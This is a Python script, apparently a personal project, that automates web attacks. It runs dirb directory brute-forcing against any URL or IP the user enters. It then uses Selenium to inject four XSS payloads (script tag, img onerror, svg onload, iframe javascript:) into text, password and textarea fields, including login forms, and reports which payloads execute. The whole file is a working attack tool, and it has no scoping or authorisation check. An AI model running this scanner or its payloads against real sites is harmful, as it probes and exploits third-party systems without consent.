import subprocess
import time
import re
from selenium import webdriver
from selenium.common.exceptions import ElementNotInteractableException, TimeoutException
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# List of XSS payloads
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src='invalid-image' onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<iframe src='javascript:alert(`XSS`)'></iframe>"
]

def is_valid_url_or_ip(url):
    """
    Check if the input is a valid URL or IP address.
    """
    url_pattern = re.compile(r'^(http://|https://)?[a-zA-Z0-9.-]+(\.[a-zA-Z]{2,})?(:\d+)?(/.*)?$')
    ip_pattern = re.compile(r'^(http://|https://)?((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)?(:\d+)?(/.*)?$')
    return url_pattern.match(url) or ip_pattern.match(url)

def run_dirb(url):
    """
    Run dirb to find subdirectories of the given URL or IP address.
    """
    subdirs = []
    try:
        process = subprocess.Popen(['dirb', url, '/home/akrakali/Documents/PI/dir.txt', '-r', '-S'],
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        print("Running dirb, please wait...")

        while True:
            line = process.stdout.readline()
            if not line and process.poll() is not None:
                break

            # Check if the line contains a valid subdirectory or file
            match = re.search(r'^\+ (.*?)( \(|$)', line)
            if match:
                path = match.group(1).strip()
                subdirs.append(path)

            print(line, end='')  # Print dirb output line by line

        process.wait()  # Wait for the process to complete
    except FileNotFoundError:
        print("Dirb is not installed or not found in PATH.")
    return subdirs

def is_worth_testing(input_name, input_type):
    """
    Determine if an input field is worth testing for XSS vulnerabilities.
    """
    # Example logic: Only test text inputs and textarea elements
    if input_type in ['text', 'password', 'textarea']:
        return True, f"Input '{input_name}' of type '{input_type}' is worth testing for XSS."
    else:
        return False, f"Input '{input_name}' of type '{input_type}' is not worth testing for XSS."

def test_xss_payloads(url, input_locators, payload, is_login_form, successful_payloads):
    """
    Function to test XSS payloads on input fields.
    """
    driver = webdriver.Firefox()
    driver.get(url)

    wait = WebDriverWait(driver, 10)
    try:
        for input_locator in input_locators:
            input_element = wait.until(EC.presence_of_element_located(input_locator))
            driver.execute_script("arguments[0].scrollIntoView(true);", input_element)
            time.sleep(0.5)  # Give some time for the scroll action

        if is_login_form:
            print(f"Testing payload '{payload}' on login form.")
            try:
                username_locator, password_locator = input_locators
                username_field = wait.until(EC.presence_of_element_located(username_locator))
                password_field = wait.until(EC.presence_of_element_located(password_locator))

                username_field.clear()
                username_field.send_keys(payload)
                password_field.clear()
                password_field.send_keys(payload)

                username_field.submit()
                time.sleep(1)  # Wait for the page to reload

                try:
                    alert = driver.switch_to.alert
                    alert_text = alert.text
                    print(f"XSS successful! Payload '{payload}' triggered an alert.")
                    alert.accept()
                    successful_payloads.append(payload)
                except:
                    print("XSS unsuccessful.")
            except (ElementNotInteractableException, TimeoutException):
                print("ElementNotInteractableException or TimeoutException occurred. Could not interact with the element.")
        else:
            for input_locator in input_locators:
                input_element = wait.until(EC.presence_of_element_located(input_locator))
                input_field_id = input_element.get_attribute("id")
                input_field_name = input_element.get_attribute("name")
                print(f"Testing payload '{payload}' on input field '{input_field_name}' (ID: {input_field_id})")
                try:
                    input_element.clear()
                    input_element.send_keys(payload)
                    input_element.submit()
                    time.sleep(1)  # Wait for the page to reload
                    try:
                        alert = driver.switch_to.alert
                        alert_text = alert.text
                        print(f"XSS successful! Payload '{payload}' triggered an alert.")
                        alert.accept()
                        successful_payloads.append(payload)
                    except:
                        print("XSS unsuccessful.")
                except (ElementNotInteractableException, TimeoutException):
                    print("ElementNotInteractableException or TimeoutException occurred. Could not interact with the element.")
    except TimeoutException:
        print("TimeoutException occurred. Element could not be found within the given time.")
    finally:
        driver.quit()

def test_url_for_xss(url, successful_payloads):
    """
    Test a given URL for XSS vulnerabilities.
    """
    driver = webdriver.Firefox()
    driver.get(url)

    try:
        # Wait for input fields to be present
        wait = WebDriverWait(driver, 10)
        input_elements = wait.until(EC.presence_of_all_elements_located((By.XPATH, "//input[@type='text'] | //input[@type='password'] | //textarea")))

        print(f"Found {len(input_elements)} input fields on the webpage.")

        # Get the locators of all input elements
        input_element_locators = []
        login_form_locators = []
        for input_element in input_elements:
            input_field_id = input_element.get_attribute("id")
            input_field_name = input_element.get_attribute("name")
            input_field_type = input_element.get_attribute("type")

            worth_testing, reason = is_worth_testing(input_field_name, input_field_type)
            print(reason)
            if worth_testing:
                if input_field_name.lower() in ["username", "user", "login", "email"]:
                    login_form_locators.append((By.NAME, input_field_name))
                elif input_field_type == "password":
                    login_form_locators.append((By.NAME, input_field_name))
                else:
                    if input_field_id:
                        input_element_locators.append((By.ID, input_field_id))
                    elif input_field_name:
                        input_element_locators.append((By.NAME, input_field_name))

        if len(login_form_locators) == 2:
            input_element_locators = login_form_locators

    except TimeoutException:
        print("TimeoutException occurred. No input elements found on the page.")
        return
    finally:
        driver.quit()

    # Check if the form is a login form
    is_login_form = len(login_form_locators) == 2

    # Iterate through each input field and test XSS payloads
    for payload in xss_payloads:
        test_xss_payloads(url, input_element_locators, payload, is_login_form, successful_payloads)

def main():
    # Get website URL or IP address from user input
    url = input("Enter the URL or IP address of the website to test: ")

    if not is_valid_url_or_ip(url):
        print("Invalid URL or IP address format.")
        return

    # Ensure the URL has a scheme
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url

    # Run dirb to find subdirectories
    print("\nRunning dirb to find subdirectories...")
    subdirs = run_dirb(url)
    print("\nSubdirectories found:")
    for subdir in subdirs:
        print(f"  - {subdir}")

    print(f"\nTotal {len(subdirs)} subdirectories found.\n")

    # List to keep track of successful payloads
    successful_payloads = []

    # Test XSS on the root URL
    print("Testing root URL for XSS...")
    test_url_for_xss(url, successful_payloads)

    # Test XSS on each subdirectory if there are any
    if subdirs:
        for subdir in subdirs:
            # Ensure subdir is a relative path
            if subdir.startswith('http://') or subdir.startswith('https://'):
                full_url = subdir
            else:
                full_url = f"{url.rstrip('/')}/{subdir.lstrip('/')}"
            print(f"\nTesting URL: {full_url}")
            test_url_for_xss(full_url, successful_payloads)

    # List successful payloads
    if successful_payloads:
        print("\n---------------------------------------------------")
        print("XSS testing completed. Successful payloads:")
        for payload in successful_payloads:
            print(f"  - {payload}")
    else:
        print("\n---------------------------------------------------")
        print("XSS testing completed. No successful payloads found.")

if __name__ == "__main__":
    main()
